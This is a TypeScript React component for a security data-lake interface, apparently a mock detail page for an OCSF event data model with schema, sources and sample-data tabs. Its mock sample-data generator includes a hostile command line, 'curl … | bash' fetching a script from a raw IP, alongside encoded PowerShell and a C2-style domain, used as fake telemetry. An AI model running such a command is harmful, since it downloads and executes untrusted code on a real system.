"use client"

import * as React from "react"
import Link from "next/link"
import { MoreVertical } from "lucide-react"
import { toast } from "sonner"

import {
  DatabaseClockIcon,
  DataModelNavIcon,
  NewWindowIcon,
  PencilIcon,
  PipelineIcon,
  PlusIcon,
  SearchDataIcon,
  ShareIcon,
  TableIcon,
} from "@/components/icons"
import { PAGE_TITLE_SEMIBOLD } from "@/components/lakewatch/pageTitleStyles"
import {
  getDataModel,
  materializationLabel,
  type DataModel,
  type Materialization,
} from "@/components/lakewatch/data-models/dataModels"
import { getOcsfClass, NORMALIZER_GROUPS } from "@/components/lakewatch/normalizers/normalizers"
import type { TargetField } from "@/components/lakewatch/normalizers/normalizerModel"
import { Badge } from "@/components/ui/badge"
import {
  Breadcrumb,
  BreadcrumbItem,
  BreadcrumbLink,
  BreadcrumbList,
  BreadcrumbPage,
  BreadcrumbSeparator,
} from "@/components/ui/breadcrumb"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import {
  Popover,
  PopoverContent,
  PopoverTrigger,
} from "@/components/ui/popover"
import { Progress } from "@/components/ui/progress"
import { SegmentedControl, SegmentedItem } from "@/components/ui/segmented-control"
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select"
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { Textarea } from "@/components/ui/textarea"

// ─── Deterministic mock helpers ─────────────────────────────────────────────

function hashString(input: string): number {
  let hash = 2166136261
  for (let i = 0; i < input.length; i++) {
    hash ^= input.charCodeAt(i)
    hash = Math.imul(hash, 16777619)
  }
  return hash >>> 0
}

function makeRng(seed: string): () => number {
  let state = hashString(seed) || 1
  return () => {
    state ^= state << 13
    state ^= state >>> 17
    state ^= state << 5
    state >>>= 0
    return state / 4294967296
  }
}

// ─── OCSF field metadata ────────────────────────────────────────────────────

const ENUM_FIELDS = new Set([
  "activity_id",
  "status_id",
  "severity_id",
  "rcode_id",
  "confidence_id",
])

function ocsfFieldType(path: string): string {
  const leaf = path.split(".").pop() ?? path
  if (path === "time") return "timestamp"
  if (ENUM_FIELDS.has(path)) return "integer · enum"
  if (path === "class_uid" || path === "category_uid") return "integer"
  if (leaf === "ip") return "string"
  if (leaf === "port") return "integer"
  if (leaf === "pid") return "integer"
  if (path.includes("is_mfa")) return "boolean"
  if (path === "traffic.bytes") return "long"
  if (path === "raw_data") return "string · json"
  return "string"
}

const FIELD_DESCRIPTIONS: Record<string, string> = {
  activity_id: "Normalized activity for the event class (enumeration).",
  time: "Event occurrence time in epoch milliseconds.",
  "user.uid": "Unique identifier of the user / principal.",
  "user.name": "Human-readable user name.",
  "user.email_addr": "Email address of the user.",
  "src_endpoint.ip": "Source IP address of the event.",
  "src_endpoint.port": "Source port of the connection.",
  "dst_endpoint.ip": "Destination IP address.",
  "dst_endpoint.port": "Destination port of the connection.",
  status_id: "Normalized outcome status (enumeration).",
  "session.is_mfa": "Whether multi-factor authentication was used.",
  "session.uid": "Correlation identifier for the session.",
  message: "Human-readable description of the event.",
  "metadata.product.name": "Name of the product that produced the event.",
  raw_data: "Original event payload retained for provenance.",
  "actor.user.uid": "Identifier of the actor performing the API call.",
  "actor.user.name": "Name of the actor performing the API call.",
  "api.service.name": "Name of the API service invoked.",
  "api.operation": "The API operation or method that was called.",
  "cloud.region": "Cloud region where the event occurred.",
  "resources.uid": "Identifier of the resource acted upon.",
  "process.pid": "Operating-system process identifier.",
  "process.name": "Name of the process image.",
  "process.cmd_line": "Full command line of the process.",
  "process.file.path": "Filesystem path of the process image.",
  "process.file.hashes.sha256": "SHA-256 hash of the process image.",
  "device.hostname": "Hostname of the device.",
  "connection_info.protocol_name": "L4 protocol name (tcp, udp, …).",
  "traffic.bytes": "Total bytes transferred on the connection.",
  "query.hostname": "The hostname being resolved.",
  "query.type": "DNS query type (A, AAAA, …).",
  rcode_id: "DNS response code (enumeration).",
  "answers.rdata": "Resource data returned in the DNS answer.",
  "finding_info.uid": "Unique identifier of the finding.",
  "finding_info.title": "Short title of the finding.",
  "finding_info.desc": "Detailed description of the finding.",
  severity_id: "Normalized severity (enumeration).",
  "resource.uid": "Identifier of the affected resource.",
}

function fieldDescription(path: string): string {
  if (FIELD_DESCRIPTIONS[path]) return FIELD_DESCRIPTIONS[path]
  const leaf = (path.split(".").pop() ?? path).replace(/_/g, " ")
  return `${leaf.charAt(0).toUpperCase()}${leaf.slice(1)}.`
}

function coverageFor(model: DataModel, field: TargetField): number {
  if (field.requirement === "required") return 100
  const rng = makeRng(`${model.id}:${field.path}`)
  if (field.requirement === "recommended") return 96 + Math.floor(rng() * 5)
  return 55 + Math.floor(rng() * 40)
}

function objectLabel(key: string): string {
  return key
    .split("_")
    .map((part) => part.charAt(0).toUpperCase() + part.slice(1))
    .join(" ")
}

const BASE_FIELDS = new Set(["activity_id", "time", "status_id", "severity_id", "message", "raw_data"])

type FieldGroup = { key: string; label: string; fields: TargetField[] }

function groupFields(fields: TargetField[]): FieldGroup[] {
  const base: TargetField[] = []
  const byObject = new Map<string, TargetField[]>()
  for (const field of fields) {
    if (BASE_FIELDS.has(field.path) || !field.path.includes(".")) {
      base.push(field)
      continue
    }
    const key = field.path.split(".")[0]
    if (!byObject.has(key)) byObject.set(key, [])
    byObject.get(key)!.push(field)
  }
  const groups: FieldGroup[] = []
  if (base.length) groups.push({ key: "base", label: "Base event", fields: base })
  for (const [key, groupFieldsList] of byObject) {
    groups.push({ key, label: objectLabel(key), fields: groupFieldsList })
  }
  return groups
}

// ─── Requirement badge ──────────────────────────────────────────────────────

function RequirementBadge({ value }: { value: TargetField["requirement"] }) {
  return (
    <Badge
      variant={value === "required" ? "destructive" : value === "recommended" ? "default_tag" : "secondary"}
      className="px-1 font-normal"
    >
      {value === "required" ? "REQ" : value === "recommended" ? "REC" : "OPT"}
    </Badge>
  )
}

function MaterializationIcon({ materialization, className }: { materialization: Materialization; className?: string }) {
  if (materialization === "pipeline") return <PipelineIcon size={16} className={className} />
  if (materialization === "materialized_view") return <DatabaseClockIcon size={16} className={className} />
  return <TableIcon size={16} className={className} />
}

// ─── Sample-data value generation ───────────────────────────────────────────

const SAMPLE_ROW_OPTIONS = [100, 500, 1000, 5000]

const NAMES = ["Alice Nguyen", "Diego Ramos", "Priya Shah", "Marcus Lee", "Sara Kim", "Tom Alvarez"]
const HOSTS = ["FIN-LT-2291", "web-prod-07", "fin-lt-1180.acme.com", "db-prod-03", "ENG-LT-4412"]
const DOMAINS = ["login.microsoftonline.com", "s3.us-west-2.amazonaws.com", "malware-c2.example", "updates.acme.com"]

function sampleValue(model: DataModel, path: string, rowSeed: string): string {
  const rng = makeRng(`${model.id}:${path}:${rowSeed}`)
  const pick = <T,>(arr: T[]): T => arr[Math.floor(rng() * arr.length)]
  const leaf = path.split(".").pop() ?? path
  if (path === "time") {
    const base = Date.UTC(2026, 7, 20, 21, 40, 0)
    return new Date(base - Math.floor(rng() * 3_600_000)).toISOString().replace("T", " ").slice(0, 19)
  }
  if (path === "activity_id") return String(1 + Math.floor(rng() * (model.classUid === 4001 ? 6 : model.classUid === 4003 ? 2 : 4)))
  if (path === "status_id") return pick(["1", "1", "1", "2"])
  if (path === "severity_id") return pick(["2", "3", "3", "4", "5"])
  if (path === "rcode_id") return pick(["0", "0", "0", "3", "2"])
  if (leaf === "ip") return `${10 + Math.floor(rng() * 40)}.${Math.floor(rng() * 256)}.${Math.floor(rng() * 256)}.${Math.floor(rng() * 256)}`
  if (leaf === "port") return pick(["443", "80", "53", "22", "8443", String(40000 + Math.floor(rng() * 20000))])
  if (leaf === "pid") return String(1000 + Math.floor(rng() * 60000))
  if (path.includes("is_mfa")) return pick(["true", "true", "false"])
  if (path === "traffic.bytes") return String(256 + Math.floor(rng() * 90000))
  if (path === "connection_info.protocol_name") return pick(["tcp", "tcp", "udp"])
  if (path === "query.hostname") return pick(DOMAINS)
  if (path === "query.type") return pick(["A", "A", "AAAA", "TXT", "CNAME"])
  if (path === "answers.rdata") return `${Math.floor(rng() * 256)}.${Math.floor(rng() * 256)}.1.1`
  if (path === "device.hostname") return pick(HOSTS)
  if (path.endsWith("email_addr")) return `${pick(["alice.nguyen", "diego.ramos", "priya.shah"])}@acme.com`
  if (leaf === "name" && path.includes("user")) return pick(NAMES)
  if (path === "api.service.name") return pick(["sts.amazonaws.com", "iam.googleapis.com", "kubernetes.api"])
  if (path === "api.operation") return pick(["AssumeRole", "CreateServiceAccount", "create pods", "SELECT"])
  if (path === "process.name") return pick(["powershell.exe", "rundll32.exe", "curl", "mshta.exe"])
  if (path === "process.cmd_line") return pick(["powershell -enc SQBFAFgA…", "curl -s http://185.12.4.9/x.sh | bash", "rundll32.exe shell32.dll,…"])
  if (path === "process.file.path") return pick(["C:\\Windows\\System32\\rundll32.exe", "/usr/bin/curl"])
  if (path === "process.file.hashes.sha256") return `${Math.floor(rng() * 1e9).toString(16)}…`
  if (path === "metadata.product.name") return pick(model.sources)
  if (path === "cloud.region") return pick(["us-west-2", "us-central1", "eu-west-1"])
  if (path === "finding_info.title") return pick(["Suspicious PowerShell Execution", "Ransomware behavior detected", "Publicly exposed bucket"])
  if (path === "finding_info.desc") return "A process exhibited suspicious behavior…"
  if (path === "message") return pick(["User login to Okta", "alice called AssumeRole", "SSH brute force"])
  if (path === "raw_data") return "{…}"
  if (leaf.endsWith("uid") || leaf === "id" || leaf.endsWith("_uid"))
    return Math.floor(rng() * 1e12).toString(16).padStart(12, "0")
  return pick(["value_a", "value_b", "value_c"])
}

// ─── Detail view ────────────────────────────────────────────────────────────

export function LakewatchDataModelDetailView({ modelId }: { modelId: string }) {
  const model = getDataModel(modelId)

  if (!model) {
    return (
      <div className="flex min-h-0 flex-1 flex-col gap-4 overflow-y-auto p-5">
        <h1 className={PAGE_TITLE_SEMIBOLD}>Data model not found</h1>
        <p className="text-sm text-muted-foreground">No data model matches “{modelId}”.</p>
        <Button variant="link" size="sm" asChild className="w-fit px-0">
          <Link href="/lakewatch/data-models">Back to Data models</Link>
        </Button>
      </div>
    )
  }

  const ocsfClass = getOcsfClass(model.id)
  const fields = ocsfClass?.fields ?? []
  const group = NORMALIZER_GROUPS.find((entry) => entry.id === model.id)
  const normalizers = group?.rows ?? []

  const [description, setDescription] = React.useState(model.description)
  const [descDraft, setDescDraft] = React.useState(model.description)
  const [descOpen, setDescOpen] = React.useState(false)

  const [steward, setSteward] = React.useState(model.steward)
  const [tags, setTags] = React.useState(model.tags.join(", "))
  const [criticality, setCriticality] = React.useState(model.criticality)
  const [ownDraft, setOwnDraft] = React.useState({ steward: model.steward, tags: model.tags.join(", "), criticality: model.criticality })
  const [ownOpen, setOwnOpen] = React.useState(false)

  const [dataView, setDataView] = React.useState<"summary" | "table">("table")
  const [sampleRows, setSampleRows] = React.useState(1000)

  const fieldGroups = React.useMemo(() => groupFields(fields), [fields])

  // Deterministic per-source volume share (sums to 100%).
  const sourceStats = React.useMemo(() => {
    const weights = normalizers.map((row) => {
      const rng = makeRng(`${model.id}:${row.identifier}`)
      return 0.4 + rng()
    })
    const total = weights.reduce((sum, weight) => sum + weight, 0)
    return normalizers.map((row, index) => {
      const rng = makeRng(`stat:${row.identifier}`)
      const pct = Math.round((weights[index] / total) * 100)
      return {
        row,
        pct,
        conformance: 97 + Math.floor(rng() * 4),
        lastRun: ["30s ago", "1 min ago", "2 min ago", "4 min ago"][Math.floor(rng() * 4)],
        healthy: rng() > 0.12,
      }
    })
  }, [normalizers, model.id])

  const previewFields = fields.filter((field) => field.path !== "raw_data")
  const previewRows = React.useMemo(
    () => Array.from({ length: Math.min(12, sampleRows) }, (_, index) => `r${index}`),
    [sampleRows]
  )

  return (
    <div className="flex min-h-0 flex-1 flex-col overflow-y-auto p-5">
      <div className="flex flex-col gap-4">
        {/* Header */}
        <div className="flex flex-col gap-2">
          <Breadcrumb>
            <BreadcrumbList>
              <BreadcrumbItem>
                <BreadcrumbLink href="/lakewatch/data-models">Data models</BreadcrumbLink>
              </BreadcrumbItem>
              <BreadcrumbSeparator />
              <BreadcrumbItem>
                <BreadcrumbPage>{model.name}</BreadcrumbPage>
              </BreadcrumbItem>
            </BreadcrumbList>
          </Breadcrumb>

          <div className="flex items-start justify-between gap-4">
            <div className="flex min-w-0 items-center gap-2">
              <DataModelNavIcon size={20} className="shrink-0 text-muted-foreground" />
              <h1 className={PAGE_TITLE_SEMIBOLD}>{model.name}</h1>
            </div>
            <div className="flex shrink-0 items-center gap-4">
              <div className="flex items-center gap-2">
                <Button variant="default" size="sm">
                  <SearchDataIcon size={16} />
                  Query
                </Button>
                <Button variant="default" size="sm">
                  <ShareIcon size={16} />
                  Share
                </Button>
                <Button variant="primary" size="sm">
                  <PlusIcon size={16} />
                  Create detection
                </Button>
                <Button variant="ghost" size="icon-sm" aria-label="More actions">
                  <MoreVertical className="h-4 w-4" />
                </Button>
              </div>
            </div>
          </div>

          <div className="flex flex-wrap items-center gap-2">
            <Badge variant="secondary" className="font-normal">
              {model.standard} {model.version}
            </Badge>
            <Badge variant="indigo" className="font-normal">
              Class {model.classUid}
            </Badge>
            <Badge
              variant={model.materialization === "pipeline" ? "teal" : model.materialization === "materialized_view" ? "purple" : "secondary"}
              className="gap-1 font-normal"
            >
              <MaterializationIcon materialization={model.materialization} className="h-3 w-3" />
              {materializationLabel(model.materialization)}
            </Badge>
            <span className="flex items-center gap-1.5 text-hint text-muted-foreground">
              <span className="h-2 w-2 rounded-full bg-[var(--success)]" aria-hidden />
              {model.status}
            </span>
          </div>
        </div>

        {/* Tabs */}
        <Tabs defaultValue="overview">
          <TabsList variant="line">
            <TabsTrigger value="overview">Overview</TabsTrigger>
            <TabsTrigger value="schema">Schema</TabsTrigger>
            <TabsTrigger value="sources">Sources ({normalizers.length})</TabsTrigger>
            <TabsTrigger value="sample">Sample data</TabsTrigger>
          </TabsList>

          {/* ── Overview ── */}
          <TabsContent value="overview" className="mt-4">
            <div className="grid gap-4 lg:grid-cols-2">
              {/* Left column */}
              <div className="flex flex-col gap-4">
                <section className="rounded-md border border-border p-4">
                  <div className="mb-2 flex items-center justify-between">
                    <h2 className="font-semibold text-foreground">Description</h2>
                    <Popover open={descOpen} onOpenChange={(open) => { setDescOpen(open); if (open) setDescDraft(description) }}>
                      <PopoverTrigger asChild>
                        <Button variant="ghost" size="icon-xs" aria-label="Edit description">
                          <PencilIcon size={16} className="text-muted-foreground" />
                        </Button>
                      </PopoverTrigger>
                      <PopoverContent align="end" className="w-80">
                        <div className="flex flex-col gap-2">
                          <Label htmlFor="dm-desc">Description</Label>
                          <Textarea
                            id="dm-desc"
                            value={descDraft}
                            onChange={(event) => setDescDraft(event.target.value)}
                            className="min-h-24"
                          />
                          <div className="flex justify-end gap-2">
                            <Button variant="default" size="xs" onClick={() => setDescOpen(false)}>Cancel</Button>
                            <Button variant="primary" size="xs" onClick={() => { setDescription(descDraft); setDescOpen(false); toast.success("Description updated") }}>Save</Button>
                          </div>
                        </div>
                      </PopoverContent>
                    </Popover>
                  </div>
                  <p className="text-sm text-foreground">{description}</p>
                </section>

                <section className="rounded-md border border-border p-4">
                  <div className="mb-3 flex items-center justify-between">
                    <h2 className="font-semibold text-foreground">Ownership &amp; tags</h2>
                    <Popover open={ownOpen} onOpenChange={(open) => { setOwnOpen(open); if (open) setOwnDraft({ steward, tags, criticality }) }}>
                      <PopoverTrigger asChild>
                        <Button variant="ghost" size="icon-xs" aria-label="Edit ownership and tags">
                          <PencilIcon size={16} className="text-muted-foreground" />
                        </Button>
                      </PopoverTrigger>
                      <PopoverContent align="end" className="w-80">
                        <div className="flex flex-col gap-3">
                          <div className="flex flex-col gap-1.5">
                            <Label htmlFor="dm-steward">Steward</Label>
                            <Input id="dm-steward" value={ownDraft.steward} onChange={(event) => setOwnDraft((prev) => ({ ...prev, steward: event.target.value }))} />
                          </div>
                          <div className="flex flex-col gap-1.5">
                            <Label htmlFor="dm-tags">Tags (comma separated)</Label>
                            <Input id="dm-tags" value={ownDraft.tags} onChange={(event) => setOwnDraft((prev) => ({ ...prev, tags: event.target.value }))} />
                          </div>
                          <div className="flex flex-col gap-1.5">
                            <Label htmlFor="dm-crit">Business criticality</Label>
                            <Select value={ownDraft.criticality} onValueChange={(value) => setOwnDraft((prev) => ({ ...prev, criticality: value as DataModel["criticality"] }))}>
                              <SelectTrigger id="dm-crit"><SelectValue /></SelectTrigger>
                              <SelectContent>
                                <SelectItem value="High">High</SelectItem>
                                <SelectItem value="Medium">Medium</SelectItem>
                                <SelectItem value="Low">Low</SelectItem>
                              </SelectContent>
                            </Select>
                          </div>
                          <div className="flex justify-end gap-2">
                            <Button variant="default" size="xs" onClick={() => setOwnOpen(false)}>Cancel</Button>
                            <Button variant="primary" size="xs" onClick={() => { setSteward(ownDraft.steward); setTags(ownDraft.tags); setCriticality(ownDraft.criticality); setOwnOpen(false); toast.success("Ownership updated") }}>Save</Button>
                          </div>
                        </div>
                      </PopoverContent>
                    </Popover>
                  </div>
                  <dl className="flex flex-col gap-3 text-sm">
                    <div className="flex items-center justify-between gap-4">
                      <dt className="text-muted-foreground">Owner</dt>
                      <dd className="text-foreground">{model.owner}</dd>
                    </div>
                    <div className="flex items-center justify-between gap-4">
                      <dt className="text-muted-foreground">Steward</dt>
                      <dd className="text-foreground">{steward}</dd>
                    </div>
                    <div className="flex items-center justify-between gap-4">
                      <dt className="text-muted-foreground">Business criticality</dt>
                      <dd className="text-foreground">{criticality}</dd>
                    </div>
                    <div className="flex items-start justify-between gap-4">
                      <dt className="shrink-0 text-muted-foreground">Tags</dt>
                      <dd className="flex flex-wrap justify-end gap-1">
                        {tags.split(",").map((tag) => tag.trim()).filter(Boolean).map((tag) => (
                          <Badge key={tag} variant="secondary" className="font-normal">{tag}</Badge>
                        ))}
                      </dd>
                    </div>
                  </dl>
                </section>
              </div>

              {/* Right column — facts */}
              <section className="rounded-md border border-border p-4">
                <h2 className="mb-3 font-semibold text-foreground">Details</h2>
                <div className="mb-3 flex items-start gap-2 rounded-md bg-muted/40 p-3">
                  <MaterializationIcon materialization={model.materialization} className="mt-0.5 text-muted-foreground" />
                  <div className="min-w-0">
                    <p className="font-semibold text-foreground">{materializationLabel(model.materialization)}</p>
                    <p className="text-hint text-muted-foreground">{model.refreshDetail}</p>
                    {model.pipelineName ? (
                      <Link href="/lakewatch" className="mt-1 inline-flex items-center gap-1 text-hint text-primary hover:underline">
                        <code>{model.pipelineName}</code>
                        <NewWindowIcon size={12} />
                      </Link>
                    ) : null}
                  </div>
                </div>
                <dl className="flex flex-col gap-3 text-sm">
                  <FactRow label="Destination table" value={<code className="text-foreground">{model.table}</code>} />
                  <FactRow label="Standard" value={`${model.standard} ${model.version}`} />
                  <FactRow label="Event class" value={`${model.eventClass} · ${model.classUid}`} />
                  <FactRow label="Category" value={model.category} />
                  <FactRow label="Created" value={model.createdAt} />
                  <FactRow label="Last updated" value={model.lastUpdated} />
                  <FactRow label="Freshness" value={model.freshness} />
                </dl>
              </section>

              {/* Stat tiles */}
              <div className="grid grid-cols-2 gap-3 sm:grid-cols-3 lg:col-span-2 lg:grid-cols-6">
                <StatTile label="Records (24h)" value={model.records.replace(" / 24h", "")} />
                <StatTile label="Total rows" value={model.totalRows} />
                <StatTile label="Sources" value={String(model.sources.length)} />
                <StatTile label="Fields" value={String(fields.length)} />
                <StatTile label="Field coverage" value={`${model.coverage}%`} />
                <StatTile label="DLQ (24h)" value={model.dlq} />
              </div>

              {/* Top sources */}
              <section className="rounded-md border border-border p-4 lg:col-span-2">
                <h2 className="mb-3 font-semibold text-foreground">Top sources by volume</h2>
                <div className="flex flex-col gap-3">
                  {sourceStats
                    .slice()
                    .sort((a, b) => b.pct - a.pct)
                    .slice(0, 5)
                    .map(({ row, pct }) => (
                      <div key={row.identifier} className="flex items-center gap-3">
                        <span className="w-56 shrink-0 truncate text-sm text-foreground">{row.sourceParser}</span>
                        <Progress value={pct} className="h-1.5 flex-1" />
                        <span className="w-10 shrink-0 text-right text-hint text-muted-foreground">{pct}%</span>
                      </div>
                    ))}
                </div>
              </section>
            </div>
          </TabsContent>

          {/* ── Schema ── */}
          <TabsContent value="schema" className="mt-4">
            <p className="mb-3 text-sm text-muted-foreground">
              Fields conform to the {model.standard} {model.version} {model.eventClass} event class. Mappings are
              defined per source in the{" "}
              <span className="text-foreground">Sources</span> that feed this model.
            </p>
            <div className="overflow-x-auto rounded-md border border-border">
              <Table className="min-w-[860px]">
                <TableHeader>
                  <TableRow className="hover:bg-transparent">
                    <TableHead className="w-[28%] font-semibold">Field</TableHead>
                    <TableHead className="w-[16%] font-semibold">Type</TableHead>
                    <TableHead className="w-[10%] font-semibold">Req.</TableHead>
                    <TableHead className="w-[18%] font-semibold">Populated</TableHead>
                    <TableHead className="w-[28%] font-semibold">Description</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {fieldGroups.map((fieldGroup) => (
                    <React.Fragment key={fieldGroup.key}>
                      <TableRow className="hover:bg-transparent">
                        <TableCell colSpan={5} className="bg-muted/50 py-2 font-semibold text-foreground">
                          {fieldGroup.label}
                        </TableCell>
                      </TableRow>
                      {fieldGroup.fields.map((field) => {
                        const cov = coverageFor(model, field)
                        return (
                          <TableRow key={field.path}>
                            <TableCell className="py-2">
                              <code className="text-foreground">{field.path}</code>
                            </TableCell>
                            <TableCell className="py-2 text-muted-foreground">{ocsfFieldType(field.path)}</TableCell>
                            <TableCell className="py-2"><RequirementBadge value={field.requirement} /></TableCell>
                            <TableCell className="py-2">
                              <span className="flex items-center gap-2">
                                <Progress value={cov} className="h-1.5 w-16" />
                                <span className="text-hint text-muted-foreground">{cov}%</span>
                              </span>
                            </TableCell>
                            <TableCell className="py-2 text-muted-foreground">{fieldDescription(field.path)}</TableCell>
                          </TableRow>
                        )
                      })}
                    </React.Fragment>
                  ))}
                </TableBody>
              </Table>
            </div>
          </TabsContent>

          {/* ── Sources ── */}
          <TabsContent value="sources" className="mt-4">
            <p className="mb-3 text-sm text-muted-foreground">
              {normalizers.length} normalizers feed this model. Edit a mapping by opening its normalizer.
            </p>
            <div className="overflow-x-auto rounded-md border border-border">
              <Table className="min-w-[980px]">
                <TableHeader>
                  <TableRow className="hover:bg-transparent">
                    <TableHead className="w-[30%] font-semibold">Normalizer</TableHead>
                    <TableHead className="w-[18%] font-semibold">Datasource</TableHead>
                    <TableHead className="w-[12%] font-semibold">% of volume</TableHead>
                    <TableHead className="w-[12%] font-semibold">Conformance</TableHead>
                    <TableHead className="w-[12%] font-semibold">Last run</TableHead>
                    <TableHead className="w-[16%] font-semibold">Status</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {sourceStats.map(({ row, pct, conformance, lastRun, healthy }) => (
                    <TableRow key={row.identifier} className="h-12">
                      <TableCell className="py-2">
                        <Link
                          href={`/lakewatch/normalizers/${encodeURIComponent(row.identifier)}`}
                          className="text-primary underline underline-offset-4"
                        >
                          {row.displayName}
                        </Link>
                      </TableCell>
                      <TableCell className="py-2 text-foreground">{row.sourceParser}</TableCell>
                      <TableCell className="py-2 text-foreground">{pct}%</TableCell>
                      <TableCell className="py-2 text-foreground">{conformance}%</TableCell>
                      <TableCell className="py-2 text-foreground">{lastRun}</TableCell>
                      <TableCell className="py-2">
                        <span className="flex items-center gap-2">
                          <span
                            className={`h-2 w-2 shrink-0 rounded-full ${healthy ? "bg-[var(--success)]" : "bg-[var(--warning)]"}`}
                            aria-hidden
                          />
                          <span className="text-foreground">{healthy ? "Healthy" : "Degraded"}</span>
                        </span>
                      </TableCell>
                    </TableRow>
                  ))}
                </TableBody>
              </Table>
            </div>
          </TabsContent>

          {/* ── Sample data ── */}
          <TabsContent value="sample" className="mt-4">
            <div className="mb-3 flex flex-wrap items-center justify-between gap-3">
              <SegmentedControl value={dataView} onValueChange={(value) => setDataView(value as "summary" | "table")}>
                <SegmentedItem value="table">Table</SegmentedItem>
                <SegmentedItem value="summary">Field summary</SegmentedItem>
              </SegmentedControl>
              <div className="flex items-center gap-2">
                <span className="text-hint text-muted-foreground">Sample</span>
                <Select value={String(sampleRows)} onValueChange={(value) => setSampleRows(Number(value))}>
                  <SelectTrigger className="w-32"><SelectValue /></SelectTrigger>
                  <SelectContent>
                    {SAMPLE_ROW_OPTIONS.map((option) => (
                      <SelectItem key={option} value={String(option)}>{option.toLocaleString()} rows</SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>
            </div>

            {dataView === "table" ? (
              <div className="overflow-x-auto rounded-md border border-border">
                <Table className="min-w-[1100px]">
                  <TableHeader>
                    <TableRow className="hover:bg-transparent">
                      {previewFields.map((field) => (
                        <TableHead key={field.path} className="whitespace-nowrap font-semibold">
                          {field.path}
                        </TableHead>
                      ))}
                    </TableRow>
                  </TableHeader>
                  <TableBody>
                    {previewRows.map((rowSeed) => (
                      <TableRow key={rowSeed}>
                        {previewFields.map((field) => (
                          <TableCell key={field.path} className="whitespace-nowrap py-2 text-foreground">
                            {sampleValue(model, field.path, rowSeed)}
                          </TableCell>
                        ))}
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </div>
            ) : (
              <div className="flex flex-col gap-1 rounded-md border border-border p-2">
                {fields.map((field) => {
                  const cov = coverageFor(model, field)
                  const distinct = field.path === "raw_data" ? sampleRows : 1 + Math.floor(makeRng(`d:${model.id}:${field.path}`)() * (ENUM_FIELDS.has(field.path) ? 5 : sampleRows))
                  return (
                    <div key={field.path} className="flex items-center gap-3 rounded px-2 py-1.5 hover:bg-muted/40">
                      <code className="w-64 shrink-0 truncate text-foreground">{field.path}</code>
                      <span className="w-24 shrink-0 text-hint text-muted-foreground">{ocsfFieldType(field.path)}</span>
                      <Progress value={cov} className="h-1.5 flex-1" />
                      <span className="w-10 shrink-0 text-right text-hint text-muted-foreground">{cov}%</span>
                      <span className="w-24 shrink-0 text-right text-hint text-muted-foreground">
                        {distinct.toLocaleString()} distinct
                      </span>
                    </div>
                  )
                })}
              </div>
            )}
            <p className="mt-2 text-hint text-muted-foreground">
              Showing {previewRows.length} of {sampleRows.toLocaleString()} sampled rows · {previewFields.length} columns
            </p>
          </TabsContent>
        </Tabs>
      </div>
    </div>
  )
}

function FactRow({ label, value }: { label: string; value: React.ReactNode }) {
  return (
    <div className="flex items-start justify-between gap-4">
      <dt className="shrink-0 text-muted-foreground">{label}</dt>
      <dd className="min-w-0 truncate text-right text-foreground">{value}</dd>
    </div>
  )
}

function StatTile({ label, value }: { label: string; value: string }) {
  return (
    <div className="rounded-md border border-border p-3">
      <p className="text-hint text-muted-foreground">{label}</p>
      <p className="mt-1 text-lg font-semibold text-foreground">{value}</p>
    </div>
  )
}
